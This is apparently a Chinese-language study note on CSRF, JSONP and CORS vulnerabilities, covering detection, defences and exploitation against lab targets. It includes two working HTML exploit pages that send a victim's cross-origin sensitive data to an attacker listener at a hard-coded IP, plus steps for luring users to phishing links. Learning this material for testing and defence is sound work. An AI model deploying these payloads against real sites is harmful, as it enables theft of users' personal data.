# CSRF(跨站请求伪造)

>目标操作系统没有对请求消息做验证，黑客可以伪造请求消息，诱导或欺骗用户执行非本意操作

## CSRF和XSS区别

### cookie特点

  cookie保存在浏览器，存储用户身份凭据信息

### http协议特点

  超文本传输协议，端口80，基于tcp/ip，无状态，每次请求响应相互独立

### cookie存储和使用流程

  关键函数，setcookie()。
  1、客户端发送带身份凭据的request请求消息到服务器
  2、服务器验证身份凭据正确则返回header中含set-cookie的键值对的response响应信息
  3、客户端浏览器接收到cookie后存储到header，后续访问服务器都会带有cookie信息
  4、服务器端以此为用户身份凭据信息

### XSS特性

- xss的cookie是从浏览器document.cookie获取的

- xss直接窃取目标登录凭据

- 浏览器有同源策略，无法跨域读取cookie

### CSRF特性

- csrf不会获取cookie，通过伪造请求，诱导用户点击,让用户发出带有用户cookie的恶意请求消息

## CSRF危害

- 盗号
- 改密码
- 改个人信息等

## CSRF产生条件

- 用户浏览器有cookie
- 用户没有登出的情况下访问攻击链接

## CSRF判断方法

- 请求参数(GET/POST)中是否有参数未知不可控，如果可知可控则存在，否则不存在

## CSRF漏洞防御

**添加一个不确定参数**

- 随机token
- 验证码或短信验证码
- 修改密码时要求用户输入原密码，因为原密码不可知

**限制同源**

- 验证referer

## CSRF漏洞利用

**GET型**

- 直接复制url，诱导用户点击

**POST型**

- 构造表单网页，诱导用户点击

**蠕虫病毒**

- CSRF和存储型XSS结合，每次XSS触发时同时触发CSRF

**同源策略**

- jsonp和cors是解决浏览器默认同源策略限制，进行不同网站之间数据传输的技术，正常使用没有安全漏洞

**靶场**

- [POCBox](https://github.com/0verSp4ce/PoCBox)
- [DoraBox](https://hub.docker.com/r/redteamwing/dorabox )

**jsonp**

- 漏洞判断方法

  - 修改callback参数值，观察是否发生变化
  - 观察响应消息中是否存在敏感信息，只要存在就是漏洞，可以跨域获取这些敏感信息

- 漏洞利用

  - pocbox生成链接
  - 诱导用户点击链接，将敏感信息发送到远程服务器
    - 开启钓鱼链接
    - 开启接收监听
    - 诱导用户点击链接，将敏感信息远程发送

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="UTF-8">
  <title>JSONP EXP跨域测试</title>
  </head>
  <body>
  <script>
  function test(json){
  new Image().src="http://101.34.185.252:8001/" + JSON.stringify(json)//攻击机监听的url和端口
  //alert(JSON.stringify(json))
  }
  </script>
  <script src="http://127.0.0.1:8000/DoraBox/csrf/jsonp.php?callback=test"></script>//有漏洞的网站url
  </body>
  </html>
  ```

- 漏洞防御 

  - 参考CSRF防御
  - 数据脱敏

**cors**

- 漏洞判断方法

  - 修改请求消息中的origin
  - 返回数据包是否发生变化并且有敏感信息

- 漏洞利用

  - pocbox生成链接
  - 诱导用户点击链接，将敏感信息发送到远程服务器
    - 开启钓鱼链接
    - 开启接收监听
    - 诱导用户点击链接，将敏感信息远程发送

  ```html
  <!DOCTYPE html>
  <html>
  <head>
  	<title>CORS TEST</title>
  </head>
  <body>
  	<div id='output'></div>
  	<script type="text/javascript">
  			var req = new XMLHttpRequest(); 
  			req.onload = reqListener; 
                  //存在漏洞的url
  			req.open('get','http://127.0.0.1:8082/DoraBox/csrf/userinfo.php',true);
  			//req.setRequestHeader("Content-Type","application/x-www-form-urlencoded;"); 
  			req.withCredentials = true;
  			req.send();
  			function reqListener() {
                  //接收监听的url
                  new Image().src="http://101.34.185.252:8001/" + window.btoa(unescape(encodeURIComponent(JSON.stringify(req.responseText))))
  			};
  	</script>
  </body>
  </html>
  ```